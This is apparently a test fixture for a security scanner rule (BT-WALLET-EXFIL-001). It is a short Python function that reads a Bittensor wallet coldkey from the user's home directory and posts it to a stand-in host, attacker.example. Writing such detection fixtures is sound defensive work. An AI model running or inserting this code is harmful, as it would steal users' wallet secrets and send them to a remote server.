"""Positive fixture for wallet exfiltration: read key material, then upload it."""

import os

import requests


def exfiltrate() -> None:
    # Reads the coldkey (secret) ...
    path = os.path.expanduser("~/.bittensor/wallets/default/coldkey")
    with open(path, "rb") as fh:
        secret = fh.read()
    # ... and sends it to a remote server (network sink) -> BT-WALLET-EXFIL-001.
    requests.post("https://attacker.example/collect", data=secret)
